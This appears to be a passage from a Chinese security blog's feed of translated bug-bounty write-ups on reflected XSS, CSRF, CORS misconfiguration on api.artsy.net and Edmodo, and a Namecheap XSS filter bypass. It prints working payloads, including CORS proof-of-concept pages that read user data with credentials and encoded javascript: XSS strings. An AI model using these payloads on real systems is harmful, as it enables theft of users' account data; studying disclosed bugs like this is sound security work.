      &lt;h4 id=&quot;原文：Command-Injection-PoC&quot;&gt;&lt;a href=&quot;#原文：Command-Injection-PoC&quot; class=&quot;headerlink&quot; title=&quot;原文：Command Injection PoC&quot;&gt;&lt;/a&gt;原文：&lt;a href=&quot;https://medium.com/bugbountywriteup/command-injection-poc-72cc3743f10d&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Command Injection PoC&lt;/a&gt;&lt;/h4&gt;&lt;h4 id=&quot;漏洞：文件名导致RCE&quot;&gt;&lt;a href=&quot;#漏洞：文件名导致RCE&quot; class=&quot;headerlink&quot; title=&quot;漏洞：文件名导致RCE&quot;&gt;&lt;/a&gt;漏洞：文件名导致RCE&lt;/h4&gt;&lt;h4 id=&quot;作者：NoGe&quot;&gt;&lt;a href=&quot;#作者：NoGe&quot; class=&quot;headerlink&quot; title=&quot;作者：NoGe&quot;&gt;&lt;/a&gt;作者：&lt;a href=&quot;https://medium.com/@p4c3n0g3&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;NoGe&lt;/a&gt;&lt;/h4&gt;&lt;h4 id=&quot;难度：中&quot;&gt;&lt;a href=&quot;#难度：中&quot; class=&quot;headerlink&quot; title=&quot;难度：中&quot;&gt;&lt;/a&gt;难度：中&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>第十二篇翻译：反射型XSS</title>
    <link href="http://TimeS0ng.github.io/2018/12/27/%E7%AC%AC%E5%8D%81%E4%BA%8C%E7%AF%87%E7%BF%BB%E8%AF%91%EF%BC%9A%E5%8F%8D%E5%B0%84%E5%9E%8BXSS/"/>
    <id>http://TimeS0ng.github.io/2018/12/27/第十二篇翻译：反射型XSS/</id>
    <published>2018-12-27T08:55:58.000Z</published>
    <updated>2018-12-27T08:57:15.975Z</updated>
    
    <content type="html"><![CDATA[<h4 id="原文：My-First-0day-Exploit-Reflected-XSS"><a href="#原文：My-First-0day-Exploit-Reflected-XSS" class="headerlink" title="原文：My First 0day Exploit (Reflected XSS)"></a>原文：<a href="https://medium.com/@alicanact60/my-first-0day-exploit-csp-bypass-reflected-xss-bugbounty-c7efa4bed3d7" target="_blank" rel="external">My First 0day Exploit (Reflected XSS)</a></h4><h4 id="漏洞：javascrip-XSS"><a href="#漏洞：javascrip-XSS" class="headerlink" title="漏洞：javascrip XSS"></a>漏洞：javascrip XSS</h4><h4 id="作者：Ali-TUTUNCU"><a href="#作者：Ali-TUTUNCU" class="headerlink" title="作者：Ali TÜTÜNCÜ"></a>作者：<a href="https://medium.com/@alicanact60?source=post_header_lockup" target="_blank" rel="external">Ali TÜTÜNCÜ</a></h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
<h2 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h2><h4 id="emsp-emsp-1-当我访问网址https-xxx-com-amp-iframe-redirect-scheme-redirect-amp-redirect-strategy-0-时，查看源码看到下面的JS代码"><a href="#emsp-emsp-1-当我访问网址https-xxx-com-amp-iframe-redirect-scheme-redirect-amp-redirect-strategy-0-时，查看源码看到下面的JS代码" class="headerlink" title="&emsp;&emsp;1. 当我访问网址https://xxx.com/amp-iframe-redirect?scheme_redirect=&amp;redirect_strategy=0 时，查看源码看到下面的JS代码"></a>&emsp;&emsp;1. 当我访问网址<a href="https://xxx.com/amp-iframe-redirect?scheme_redirect=&amp;redirect_strategy=0" target="_blank" rel="external">https://xxx.com/amp-iframe-redirect?scheme_redirect=&amp;redirect_strategy=0</a> 时，查看源码看到下面的JS代码</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_12/1.png" alt=""></p>
<h4 id="emsp-emsp-2-然后我开始测试URL参数是否可控，可以看到redirect-strategy参数中的值被嵌入了JS代码中，但是特殊符号被HTML编码了"><a href="#emsp-emsp-2-然后我开始测试URL参数是否可控，可以看到redirect-strategy参数中的值被嵌入了JS代码中，但是特殊符号被HTML编码了" class="headerlink" title="&emsp;&emsp;2. 然后我开始测试URL参数是否可控，可以看到redirect_strategy参数中的值被嵌入了JS代码中，但是特殊符号被HTML编码了"></a>&emsp;&emsp;2. 然后我开始测试URL参数是否可控，可以看到redirect_strategy参数中的值被嵌入了JS代码中，但是特殊符号被HTML编码了</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://xxx.com/amp-iframe-redirect?scheme_redirect=&amp;redirect_strategy=&quot;&apos;&lt;&gt;/();</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_12/2.png" alt=""></p>
<h4 id="emsp-emsp-3-因为正常的XSS语句不能直接使用，所以我只能通过控制JS代码来嵌入XSS语句"><a href="#emsp-emsp-3-因为正常的XSS语句不能直接使用，所以我只能通过控制JS代码来嵌入XSS语句" class="headerlink" title="&emsp;&emsp;3. 因为正常的XSS语句不能直接使用，所以我只能通过控制JS代码来嵌入XSS语句"></a>&emsp;&emsp;3. 因为正常的XSS语句不能直接使用，所以我只能通过控制JS代码来嵌入XSS语句</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://xxx.com/amp-iframe-redirect?scheme_redirect=&amp;redirect_strategy=); alert(document.domain); if(1</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_12/3.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;原文：My-First-0day-Exploit-Reflected-XSS&quot;&gt;&lt;a href=&quot;#原文：My-First-0day-Exploit-Reflected-XSS&quot; class=&quot;headerlink&quot; title=&quot;原文：My First 0day Exploit (Reflected XSS)&quot;&gt;&lt;/a&gt;原文：&lt;a href=&quot;https://medium.com/@alicanact60/my-first-0day-exploit-csp-bypass-reflected-xss-bugbounty-c7efa4bed3d7&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;My First 0day Exploit (Reflected XSS)&lt;/a&gt;&lt;/h4&gt;&lt;h4 id=&quot;漏洞：javascrip-XSS&quot;&gt;&lt;a href=&quot;#漏洞：javascrip-XSS&quot; class=&quot;headerlink&quot; title=&quot;漏洞：javascrip XSS&quot;&gt;&lt;/a&gt;漏洞：javascrip XSS&lt;/h4&gt;&lt;h4 id=&quot;作者：Ali-TUTUNCU&quot;&gt;&lt;a href=&quot;#作者：Ali-TUTUNCU&quot; class=&quot;headerlink&quot; title=&quot;作者：Ali TÜTÜNCÜ&quot;&gt;&lt;/a&gt;作者：&lt;a href=&quot;https://medium.com/@alicanact60?source=post_header_lockup&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Ali TÜTÜNCÜ&lt;/a&gt;&lt;/h4&gt;&lt;h4 id=&quot;难度：低&quot;&gt;&lt;a href=&quot;#难度：低&quot; class=&quot;headerlink&quot; title=&quot;难度：低&quot;&gt;&lt;/a&gt;难度：低&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>第十一篇翻译：CSRF漏洞</title>
    <link href="http://TimeS0ng.github.io/2018/12/27/%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AF%87%E7%BF%BB%E8%AF%91%EF%BC%9ACSRF%E6%BC%8F%E6%B4%9E/"/>
    <id>http://TimeS0ng.github.io/2018/12/27/第十一篇翻译：CSRF漏洞/</id>
    <published>2018-12-27T07:41:25.000Z</published>
    <updated>2019-01-25T01:10:21.706Z</updated>
    
    <content type="html"><![CDATA[<h4 id="原文：CSRF-account-takeover-Explained-Automated-Manual-—-Bug-Bounty"><a href="#原文：CSRF-account-takeover-Explained-Automated-Manual-—-Bug-Bounty" class="headerlink" title="原文：CSRF account takeover Explained Automated/Manual — Bug Bounty"></a>原文：<a href="https://medium.com/bugbountywriteup/csrf-account-takeover-explained-automated-manual-bug-bounty-447e4b96485b" target="_blank" rel="external">CSRF account takeover Explained Automated/Manual — Bug Bounty</a></h4><h4 id="漏洞：CSRF"><a href="#漏洞：CSRF" class="headerlink" title="漏洞：CSRF"></a>漏洞：CSRF</h4><h4 id="作者：Vulnerables"><a href="#作者：Vulnerables" class="headerlink" title="作者：Vulnerables"></a>作者：<a href="https://medium.com/@vulnerables?source=post_header_lockup" target="_blank" rel="external">Vulnerables</a></h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
<h4 id="emsp-emsp-作者给出的视屏讲解得已经够详细了，很容易理解，我就只给出视屏啦！"><a href="#emsp-emsp-作者给出的视屏讲解得已经够详细了，很容易理解，我就只给出视屏啦！" class="headerlink" title="&emsp;&emsp;作者给出的视屏讲解得已经够详细了，很容易理解，我就只给出视屏啦！"></a>&emsp;&emsp;作者给出的视屏讲解得已经够详细了，很容易理解，我就只给出视屏啦！</h4><p>|</p>
<p>|</p>
<video id="video" controls preload="none" poster="http://img5.imgtn.bdimg.com/it/u=750248180,3726006403&fm=26&gp=0.jpg"><br><source id="mp4" src="http://img.027cgb.com/612577/times0ng_blog/translate_11/CSRF.mp4" type="video/mp4"><br></video>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;原文：CSRF-account-takeover-Explained-Automated-Manual-—-Bug-Bounty&quot;&gt;&lt;a href=&quot;#原文：CSRF-account-takeover-Explained-Automated-Manual-—-Bug-Bounty&quot; class=&quot;headerlink&quot; title=&quot;原文：CSRF account takeover Explained Automated/Manual — Bug Bounty&quot;&gt;&lt;/a&gt;原文：&lt;a href=&quot;https://medium.com/bugbountywriteup/csrf-account-takeover-explained-automated-manual-bug-bounty-447e4b96485b&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;CSRF account takeover Explained Automated/Manual — Bug Bounty&lt;/a&gt;&lt;/h4&gt;&lt;h4 id=&quot;漏洞：CSRF&quot;&gt;&lt;a href=&quot;#漏洞：CSRF&quot; class=&quot;headerlink&quot; title=&quot;漏洞：CSRF&quot;&gt;&lt;/a&gt;漏洞：CSRF&lt;/h4&gt;&lt;h4 id=&quot;作者：Vulnerables&quot;&gt;&lt;a href=&quot;#作者：Vulnerables&quot; class=&quot;headerlink&quot; title=&quot;作者：Vulnerables&quot;&gt;&lt;/a&gt;作者：&lt;a href=&quot;https://medium.com/@vulnerables?source=post_header_lockup&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Vulnerables&lt;/a&gt;&lt;/h4&gt;&lt;h4 id=&quot;难度：低&quot;&gt;&lt;a href=&quot;#难度：低&quot; class=&quot;headerlink&quot; title=&quot;难度：低&quot;&gt;&lt;/a&gt;难度：低&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>第十篇翻译：CORS跨域请求</title>
    <link href="http://TimeS0ng.github.io/2018/12/23/%E7%AC%AC%E5%8D%81%E7%AF%87%E7%BF%BB%E8%AF%91%EF%BC%9ACORS%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82/"/>
    <id>http://TimeS0ng.github.io/2018/12/23/第十篇翻译：CORS跨域请求/</id>
    <published>2018-12-23T10:33:56.000Z</published>
    <updated>2019-01-30T07:05:57.273Z</updated>
    
    <content type="html"><![CDATA[<h4 id="原文：Exploiting-Insecure-Cross-Origin-Resource-Sharing-CORS-api-artsy-net"><a href="#原文：Exploiting-Insecure-Cross-Origin-Resource-Sharing-CORS-api-artsy-net" class="headerlink" title="原文：Exploiting Insecure Cross Origin Resource Sharing ( CORS ) | api.artsy.net"></a>原文：<a href="https://blog.securitybreached.org/2017/10/10/exploiting-insecure-cross-origin-resource-sharing-cors-api-artsy-net/" target="_blank" rel="external">Exploiting Insecure Cross Origin Resource Sharing ( CORS ) | api.artsy.net</a></h4><h4 id="漏洞：跨域请求"><a href="#漏洞：跨域请求" class="headerlink" title="漏洞：跨域请求"></a>漏洞：跨域请求</h4><h4 id="作者：Muhammad-Khizer-Javed"><a href="#作者：Muhammad-Khizer-Javed" class="headerlink" title="作者：Muhammad Khizer Javed"></a>作者：<a href="https://blog.securitybreached.org/author/babayaga47/" target="_blank" rel="external">Muhammad Khizer Javed</a></h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
<h4 id="emsp-emsp-大家好！几个月来我测试了许多不同站点的CORS（跨域资源共享）问题，以便我能更实际的了解它。如果想要测试一个站点是否存在CORS漏洞，我们先用curl来检测"><a href="#emsp-emsp-大家好！几个月来我测试了许多不同站点的CORS（跨域资源共享）问题，以便我能更实际的了解它。如果想要测试一个站点是否存在CORS漏洞，我们先用curl来检测" class="headerlink" title="&emsp;&emsp;大家好！几个月来我测试了许多不同站点的CORS（跨域资源共享）问题，以便我能更实际的了解它。如果想要测试一个站点是否存在CORS漏洞，我们先用curl来检测"></a>&emsp;&emsp;大家好！几个月来我测试了许多不同站点的CORS（跨域资源共享）问题，以便我能更实际的了解它。如果想要测试一个站点是否存在CORS漏洞，我们先用curl来检测</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl https://api.artsy.net -H &quot;Origin: https://evil.com&quot; -I</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_10/1.png" alt=""></p>
<h4 id="emsp-正如您所见，Curl请求的响应包括如下所示，这意味着该站点存在CORS漏洞"><a href="#emsp-正如您所见，Curl请求的响应包括如下所示，这意味着该站点存在CORS漏洞" class="headerlink" title="&emsp;正如您所见，Curl请求的响应包括如下所示，这意味着该站点存在CORS漏洞"></a>&emsp;正如您所见，Curl请求的响应包括如下所示，这意味着该站点存在CORS漏洞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Access-Control-Allow-Credentials: true</div><div class="line">Access-Control-Allow-Origin: https://evil.com</div></pre></td></tr></table></figure>
<h4 id="emsp-emsp-现在需要做的就是找一个能获取用户信息的API接口，然后构建我们的EXP站点"><a href="#emsp-emsp-现在需要做的就是找一个能获取用户信息的API接口，然后构建我们的EXP站点" class="headerlink" title="&emsp;&emsp;现在需要做的就是找一个能获取用户信息的API接口，然后构建我们的EXP站点"></a>&emsp;&emsp;现在需要做的就是找一个能获取用户信息的API接口，然后构建我们的EXP站点</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://api.artsy.net/api/user_details/user</div></pre></td></tr></table></figure>
<p>[*]payload代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">function cors() &#123;</div><div class="line">var xhttp = new XMLHttpRequest();</div><div class="line">xhttp.onreadystatechange = function() &#123;</div><div class="line">if (this.readyState == 4 &amp;&amp; this.status == 200) &#123;</div><div class="line">document.getElementById(&quot;demo&quot;).innerHTML =</div><div class="line">alert(this.responseText);</div><div class="line">&#125;</div><div class="line">&#125;;</div><div class="line">xhttp.open(&quot;GET&quot;, &quot;https://api.artsy.net/api/user_details/&lt;User-ID&gt;&quot;, true);</div><div class="line">xhttp.withCredentials = true;</div><div class="line">xhttp.send();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_10/3.png" alt=""></p>
<h2 id="视屏"><a href="#视屏" class="headerlink" title="视屏"></a>视屏</h2><video id="video" controls preload="none" poster="http://img5.imgtn.bdimg.com/it/u=750248180,3726006403&fm=26&gp=0.jpg"><br><source id="mp4" src="http://img.027cgb.com/612577/times0ng_blog/translate_10/CORS.mp4" type="video/mp4"><br></video>



<h2 id="打赏译者"><a href="#打赏译者" class="headerlink" title="打赏译者"></a>打赏译者</h2><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_1/money.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;原文：Exploiting-Insecure-Cross-Origin-Resource-Sharing-CORS-api-artsy-net&quot;&gt;&lt;a href=&quot;#原文：Exploiting-Insecure-Cross-Origin-Resource-Sharing-CORS-api-artsy-net&quot; class=&quot;headerlink&quot; title=&quot;原文：Exploiting Insecure Cross Origin Resource Sharing ( CORS ) | api.artsy.net&quot;&gt;&lt;/a&gt;原文：&lt;a href=&quot;https://blog.securitybreached.org/2017/10/10/exploiting-insecure-cross-origin-resource-sharing-cors-api-artsy-net/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Exploiting Insecure Cross Origin Resource Sharing ( CORS ) | api.artsy.net&lt;/a&gt;&lt;/h4&gt;&lt;h4 id=&quot;漏洞：跨域请求&quot;&gt;&lt;a href=&quot;#漏洞：跨域请求&quot; class=&quot;headerlink&quot; title=&quot;漏洞：跨域请求&quot;&gt;&lt;/a&gt;漏洞：跨域请求&lt;/h4&gt;&lt;h4 id=&quot;作者：Muhammad-Khizer-Javed&quot;&gt;&lt;a href=&quot;#作者：Muhammad-Khizer-Javed&quot; class=&quot;headerlink&quot; title=&quot;作者：Muhammad Khizer Javed&quot;&gt;&lt;/a&gt;作者：&lt;a href=&quot;https://blog.securitybreached.org/author/babayaga47/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Muhammad Khizer Javed&lt;/a&gt;&lt;/h4&gt;&lt;h4 id=&quot;难度：低&quot;&gt;&lt;a href=&quot;#难度：低&quot; class=&quot;headerlink&quot; title=&quot;难度：低&quot;&gt;&lt;/a&gt;难度：低&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>第九篇翻译：CORS跨域请求</title>
    <link href="http://TimeS0ng.github.io/2018/12/23/%E7%AC%AC%E4%B9%9D%E7%AF%87%E7%BF%BB%E8%AF%91%EF%BC%9ACORS%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82/"/>
    <id>http://TimeS0ng.github.io/2018/12/23/第九篇翻译：CORS跨域请求/</id>
    <published>2018-12-23T10:10:38.000Z</published>
    <updated>2019-01-25T01:06:42.966Z</updated>
    
    <content type="html"><![CDATA[<h4 id="原文：Exploitation-of-CORS-Cross-Origin-Resource-Sharing-on-Edmodo"><a href="#原文：Exploitation-of-CORS-Cross-Origin-Resource-Sharing-on-Edmodo" class="headerlink" title="原文：Exploitation of CORS(Cross Origin Resource Sharing) on Edmodo"></a>原文：<a href="https://medium.com/@Skylinearafat/exploitation-of-cors-cross-origin-resource-sharing-on-edmodo-aa90431a3cb6" target="_blank" rel="external">Exploitation of CORS(Cross Origin Resource Sharing) on Edmodo</a></h4><h4 id="漏洞：跨域请求"><a href="#漏洞：跨域请求" class="headerlink" title="漏洞：跨域请求"></a>漏洞：跨域请求</h4><h4 id="作者：Yeasir-Arafat"><a href="#作者：Yeasir-Arafat" class="headerlink" title="作者：Yeasir Arafat"></a>作者：<a href="https://medium.com/@Skylinearafat?source=post_header_lockup" target="_blank" rel="external">Yeasir Arafat</a></h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
<h4 id="emsp-emsp-现在我正在渗透Edmodo，我察觉到某个API接口可能存在CORS漏洞。首先我们必须先确认该站点是否能够跨域请求资源，于是我利用了curl来检测。然后它返回Access-Control-Allowed-Credentials-true-这意味着这里存在一个CORS漏洞"><a href="#emsp-emsp-现在我正在渗透Edmodo，我察觉到某个API接口可能存在CORS漏洞。首先我们必须先确认该站点是否能够跨域请求资源，于是我利用了curl来检测。然后它返回Access-Control-Allowed-Credentials-true-这意味着这里存在一个CORS漏洞" class="headerlink" title="&emsp;&emsp;现在我正在渗透Edmodo，我察觉到某个API接口可能存在CORS漏洞。首先我们必须先确认该站点是否能够跨域请求资源，于是我利用了curl来检测。然后它返回Access-Control-Allowed-Credentials: true 这意味着这里存在一个CORS漏洞"></a>&emsp;&emsp;现在我正在渗透Edmodo，我察觉到某个API接口可能存在CORS漏洞。首先我们必须先确认该站点是否能够跨域请求资源，于是我利用了curl来检测。然后它返回Access-Control-Allowed-Credentials: true 这意味着这里存在一个CORS漏洞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl https://api.edmodo.com -H &quot;Origin: https://evil.com&quot; -I</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_9/1.png" alt=""></p>
<h4 id="emsp-emsp-用户访问https-api-edmodo-com-users-id-时浏览器会返回从服务端获取到的数据"><a href="#emsp-emsp-用户访问https-api-edmodo-com-users-id-时浏览器会返回从服务端获取到的数据" class="headerlink" title="&emsp;&emsp;用户访问https://api.edmodo.com/users/id 时浏览器会返回从服务端获取到的数据"></a>&emsp;&emsp;用户访问<a href="https://api.edmodo.com/users/125917217" target="_blank" rel="external">https://api.edmodo.com/users/</a>id 时浏览器会返回从服务端获取到的数据</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_9/2.png" alt=""></p>
<h4 id="emsp-emsp-所以最终的payload如下"><a href="#emsp-emsp-所以最终的payload如下" class="headerlink" title="&emsp;&emsp;所以最终的payload如下"></a>&emsp;&emsp;所以最终的payload如下</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;title&gt;CORS PoC Exploit&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;center&gt;</div><div class="line">&lt;h1&gt;CORS Exploit&lt;br&gt;Yeasir Arafat&lt;/h1&gt;</div><div class="line">&lt;hr&gt;</div><div class="line">&lt;div id=&quot;demo&quot;&gt;</div><div class="line">&lt;button type=&quot;button&quot; onclick=&quot;cors()&quot;&gt;Exploit&lt;/button&gt;</div><div class="line">&lt;/div&gt;</div><div class="line">&lt;script type=&quot;text/javascript&quot;&gt;</div><div class="line">function cors() &#123;</div><div class="line">var xhttp = new XMLHttpRequest();</div><div class="line">xhttp.onreadystatechange = function() &#123;</div><div class="line">if(this.readyState == 4 &amp;&amp; this.status == 200) &#123;</div><div class="line">document.getElementById(&quot;demo&quot;).innerHTML = this.responseText;</div><div class="line">&#125;</div><div class="line">&#125;;</div><div class="line">xhttp.open(&quot;GET&quot;, &quot;https://api.edmodo.com/users/id&quot;, true);</div><div class="line">xhttp.withCredentials = true;</div><div class="line">xhttp.send();</div><div class="line">&#125;</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;/center&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<h4 id="emsp-emsp-当我配置好钓鱼页面之后，一旦用户点击就会触发跨域请求，将用户信息发送给我"><a href="#emsp-emsp-当我配置好钓鱼页面之后，一旦用户点击就会触发跨域请求，将用户信息发送给我" class="headerlink" title="&emsp;&emsp;当我配置好钓鱼页面之后，一旦用户点击就会触发跨域请求，将用户信息发送给我"></a>&emsp;&emsp;当我配置好钓鱼页面之后，一旦用户点击就会触发跨域请求，将用户信息发送给我</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_9/3.png" alt=""></p>
<h2 id="打赏译者"><a href="#打赏译者" class="headerlink" title="打赏译者"></a>打赏译者</h2><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_1/money.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;原文：Exploitation-of-CORS-Cross-Origin-Resource-Sharing-on-Edmodo&quot;&gt;&lt;a href=&quot;#原文：Exploitation-of-CORS-Cross-Origin-Resource-Sharing-on-Edmodo&quot; class=&quot;headerlink&quot; title=&quot;原文：Exploitation of CORS(Cross Origin Resource Sharing) on Edmodo&quot;&gt;&lt;/a&gt;原文：&lt;a href=&quot;https://medium.com/@Skylinearafat/exploitation-of-cors-cross-origin-resource-sharing-on-edmodo-aa90431a3cb6&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Exploitation of CORS(Cross Origin Resource Sharing) on Edmodo&lt;/a&gt;&lt;/h4&gt;&lt;h4 id=&quot;漏洞：跨域请求&quot;&gt;&lt;a href=&quot;#漏洞：跨域请求&quot; class=&quot;headerlink&quot; title=&quot;漏洞：跨域请求&quot;&gt;&lt;/a&gt;漏洞：跨域请求&lt;/h4&gt;&lt;h4 id=&quot;作者：Yeasir-Arafat&quot;&gt;&lt;a href=&quot;#作者：Yeasir-Arafat&quot; class=&quot;headerlink&quot; title=&quot;作者：Yeasir Arafat&quot;&gt;&lt;/a&gt;作者：&lt;a href=&quot;https://medium.com/@Skylinearafat?source=post_header_lockup&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Yeasir Arafat&lt;/a&gt;&lt;/h4&gt;&lt;h4 id=&quot;难度：低&quot;&gt;&lt;a href=&quot;#难度：低&quot; class=&quot;headerlink&quot; title=&quot;难度：低&quot;&gt;&lt;/a&gt;难度：低&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>第八篇翻译：绕过XSS防护</title>
    <link href="http://TimeS0ng.github.io/2018/12/23/%E7%AC%AC%E5%85%AB%E7%AF%87%E7%BF%BB%E8%AF%91%EF%BC%9A%E7%BB%95%E8%BF%87XSS%E9%98%B2%E6%8A%A4/"/>
    <id>http://TimeS0ng.github.io/2018/12/23/第八篇翻译：绕过XSS防护/</id>
    <published>2018-12-23T07:50:57.000Z</published>
    <updated>2019-01-25T01:11:01.105Z</updated>
    
    <content type="html"><![CDATA[<h4 id="原文：The-story-behined-the-Strong-XSS-filter-bypass"><a href="#原文：The-story-behined-the-Strong-XSS-filter-bypass" class="headerlink" title="原文：The story behined the Strong XSS filter bypass!"></a>原文：<a href="https://medium.com/@Skylinearafat/the-story-behined-the-namecheap-xss-filter-bypass-be79624fd0c3" target="_blank" rel="external">The story behined the Strong XSS filter bypass!</a></h4><h4 id="漏洞：编码绕过XSS防火墙"><a href="#漏洞：编码绕过XSS防火墙" class="headerlink" title="漏洞：编码绕过XSS防火墙"></a>漏洞：编码绕过XSS防火墙</h4><h4 id="作者：Yeasir-Arafat"><a href="#作者：Yeasir-Arafat" class="headerlink" title="作者：Yeasir Arafat"></a>作者：<a href="https://medium.com/@Skylinearafat?source=post_header_lockup" target="_blank" rel="external">Yeasir Arafat</a></h4><h4 id="难度：中"><a href="#难度：中" class="headerlink" title="难度：中"></a>难度：中</h4><a id="more"></a>
<h4 id="emsp-emsp-今天的主题是关于如何绕过XSS过滤。我已经观察目标网站很久了，并且一直在尝试利用谷歌语法试图发现网站的子域名，大家也可以尝试一下。好不容易找到几个子域，正当我尝试XSS注入的时候，却被防火墙各种蹂躏"><a href="#emsp-emsp-今天的主题是关于如何绕过XSS过滤。我已经观察目标网站很久了，并且一直在尝试利用谷歌语法试图发现网站的子域名，大家也可以尝试一下。好不容易找到几个子域，正当我尝试XSS注入的时候，却被防火墙各种蹂躏" class="headerlink" title="&emsp;&emsp;今天的主题是关于如何绕过XSS过滤。我已经观察目标网站很久了，并且一直在尝试利用谷歌语法试图发现网站的子域名，大家也可以尝试一下。好不容易找到几个子域，正当我尝试XSS注入的时候，却被防火墙各种蹂躏"></a>&emsp;&emsp;今天的主题是关于如何绕过XSS过滤。我已经观察目标网站很久了，并且一直在尝试利用谷歌语法试图发现网站的子域名，大家也可以尝试一下。好不容易找到几个子域，正当我尝试XSS注入的时候，却被防火墙各种蹂躏</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">site:*.*.namecheap.com &amp; site:*.namecheap.com</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_8/1.png" alt=""></p>
<h4 id="emsp-emsp-虽然痛不欲生，但我是那种会放弃的人吗？经过多方面的尝试之后，终于发现了一种莫名其妙的编码方式能够绕过防火墙"><a href="#emsp-emsp-虽然痛不欲生，但我是那种会放弃的人吗？经过多方面的尝试之后，终于发现了一种莫名其妙的编码方式能够绕过防火墙" class="headerlink" title="&emsp;&emsp;虽然痛不欲生，但我是那种会放弃的人吗？经过多方面的尝试之后，终于发现了一种莫名其妙的编码方式能够绕过防火墙"></a>&emsp;&emsp;虽然痛不欲生，但我是那种会放弃的人吗？经过多方面的尝试之后，终于发现了一种莫名其妙的编码方式能够绕过防火墙</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;a href=&quot;javascript&amp;colon;alert&amp;lpar;document&amp;period;domain&amp;rpar;&quot;&gt;Click Here&lt;/a&gt;</div><div class="line">&quot;&gt;&lt;iframe/src=javascript&amp;colon;[document&amp;period;domain].find(alert(1))&gt;</div></pre></td></tr></table></figure>
<h2 id="视屏"><a href="#视屏" class="headerlink" title="视屏"></a>视屏</h2><p>[*]xss-1</p>
<video id="video" controls preload="none" poster="http://img5.imgtn.bdimg.com/it/u=750248180,3726006403&fm=26&gp=0.jpg"><br><source id="mp4" src="http://img.027cgb.com/612577/times0ng_blog/translate_8/xss-1.mp4"><br></video>


<p>[*]xss-2</p>
